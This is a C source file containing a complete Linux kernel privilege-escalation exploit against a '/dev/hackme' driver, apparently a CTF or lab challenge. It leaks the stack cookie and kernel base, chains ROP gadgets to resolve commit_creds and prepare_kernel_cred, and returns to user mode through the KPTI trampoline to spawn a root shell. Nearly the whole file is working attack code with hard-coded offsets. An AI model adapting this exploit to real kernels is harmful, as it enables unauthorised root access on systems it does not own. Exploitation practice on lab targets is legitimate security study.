#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++
#define save_state(val)                                   \
    do {                                                  \
        __asm__(                                          \
            ".intel_syntax noprefix;"                     \
            "mov user_cs, cs;"                            \
            "mov user_ss, ss;"                            \
            "mov user_rsp, rsp;"                          \
            "mov user_rbp, rbp;" /*this to make sure stack frame doesnt corrupt*/ \
            "pushfq;"                                     \
            "pop user_rflags;"                            \
            ".att_syntax;"                                \
        );                                                \
        user_rip = val;                                   \
        puts("[$] saved state");                          \
    } while (0)

typedef uint64_t u64;

u64 dev_fd;
u64 user_rip, user_cs, user_rflags, user_rsp, user_ss, user_rbp, commit_creds, prepare_kernel_cred;
u64 cookie, img_base, ksymtab_commit_creds, ksymtab_prepare_kernel_cred, trampoline;
u64 pop_rax, read_mem, pop_rdi_rbp, tmp_store, root_cred;

void win()
{
    if(getuid() == 0)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        puts("[*] enjoy");
        execve(argv[0], argv, envp);
    }
    else puts("[!] fail uid");
}

void open_device()
{
    puts("[*] opening device");

    dev_fd = open("/dev/hackme", 2);
    if(dev_fd < 1) puts("[!] fail fd");
}

void leak()
{
    u64 leak[40];
    read(dev_fd, leak, 40 * 8);
    cookie = leak[16];
    img_base = leak[38] - 0xa157; // cat /proc/kallsyms | grep "startup_64"

    printf("[*] cookie: 0x%lx\n", cookie);
    printf("[*] img_base: 0x%lx\n", img_base);

    ksymtab_commit_creds = img_base + 0xf87d90; // cat /proc/kallsyms | grep "ksymtab_commit_creds"
    ksymtab_prepare_kernel_cred = img_base + 0xf8d4fc; // cat /proc/kallsyms | grep "ksymtab_prepare_kernel_cred"
    trampoline = img_base + 0x200f26; // cat /proc/kallsyms | grep "swapgs_restore_regs_and_return_to_usermode"
    pop_rax = img_base + 0x4d11; // pop rax; ret; (find by hand ?)
    read_mem = img_base + 0x4aae; // mov eax, qword ptr [rax + 0x10]; pop rbp; ret; (find by hand ?)
    pop_rdi_rbp = img_base + 0x38a0; // pop rdi; pop rbp; ret; (find by hand ?)
}

void overflow_leak_commit_creds()
{
    puts("[*] leaking commit_creds");
    puts("[*][*] prepare rop chain");

    u64 rop[50];
    u64 idx = 16;

    save_state(0);
    user_rip = (u64)(&&label); // dark magic code (thanks chatgpt)

    rop[inc] = cookie;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = pop_rax;
    rop[inc] = ksymtab_commit_creds - 0x10;
    rop[inc] = read_mem;
    rop[inc] = user_rbp; // rbp
    rop[inc] = trampoline;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = user_rip;
    rop[inc] = user_cs;
    rop[inc] = user_rflags;
    rop[inc] = user_rsp;
    rop[inc] = user_ss;

    puts("[*][*] overwriting");
    write(dev_fd, (char *)&rop, idx * 8);

    puts("[!] should never be reached"); // flow should be directly to label

label:
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;"
    );
    commit_creds = ksymtab_commit_creds + (int)tmp_store; // must be int (because its eax and struct kernel_symbol)
    printf("[*] commit_creds: 0x%lx\n", commit_creds);
}

void overflow_leak_prepare_kernel_cred()
{
    puts("[*] leaking prepare_kernel_cred");
    puts("[*][*] prepare rop chain");

    u64 rop[50];
    u64 idx = 16;

    save_state(0);
    user_rip = (u64)(&&label); // dark magic code (thanks chatgpt)

    rop[inc] = cookie;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = pop_rax;
    rop[inc] = ksymtab_prepare_kernel_cred - 0x10;
    rop[inc] = read_mem;
    rop[inc] = user_rbp; // rbp
    rop[inc] = trampoline;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = user_rip;
    rop[inc] = user_cs;
    rop[inc] = user_rflags;
    rop[inc] = user_rsp;
    rop[inc] = user_ss;

    puts("[*][*] overwriting");
    write(dev_fd, (char *)&rop, idx * 8);

    puts("[!] should never be reached"); // flow should be directly to label

label:
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;"
    );
    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_store; // must be int (because its eax and struct kernel_symbol)
    printf("[*] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
}

void overflow_leak_root_cred()
{
    puts("[*] leaking root_cred");
    puts("[*][*] prepare rop chain");

    u64 rop[50];
    u64 idx = 16;

    save_state(0);
    user_rip = (u64)(&&label); // dark magic code (thanks chatgpt)

    rop[inc] = cookie;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = pop_rdi_rbp;
    rop[inc] = 0;
    rop[inc] = user_rbp;
    rop[inc] = prepare_kernel_cred;
    rop[inc] = trampoline;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = user_rip;
    rop[inc] = user_cs;
    rop[inc] = user_rflags;
    rop[inc] = user_rsp;
    rop[inc] = user_ss;

    puts("[*][*] overwriting");
    write(dev_fd, (char *)&rop, idx * 8);

    puts("[!] should never be reached"); // flow should be directly to label

label:
    __asm__(
        ".intel_syntax noprefix;"
        "mov tmp_store, rax;"
        ".att_syntax;"
    );
    root_cred = tmp_store; // must be int (because its eax and struct kernel_symbol)
    printf("[*] root_cred: 0x%lx\n", root_cred);
}

void overflow_ret2root()
{
    puts("[*] ret2root");
    puts("[*][*] prepare rop chain");

    u64 rop[50];
    u64 idx = 16;

    save_state((u64)&win);

    rop[inc] = cookie;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = pop_rdi_rbp;
    rop[inc] = root_cred;
    rop[inc] = user_rbp;
    rop[inc] = commit_creds;
    rop[inc] = trampoline;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = user_rip;
    rop[inc] = user_cs;
    rop[inc] = user_rflags;
    rop[inc] = user_rsp;
    rop[inc] = user_ss;

    puts("[*][*] overwriting");
    write(dev_fd, (char *)&rop, idx * 8);

    puts("[!] should never be reached");
}

int main()
{
    open_device();
    leak();
    overflow_leak_commit_creds();
    overflow_leak_prepare_kernel_cred();
    overflow_leak_root_cred();
    overflow_ret2root();

    puts("[!] should never be reached");
}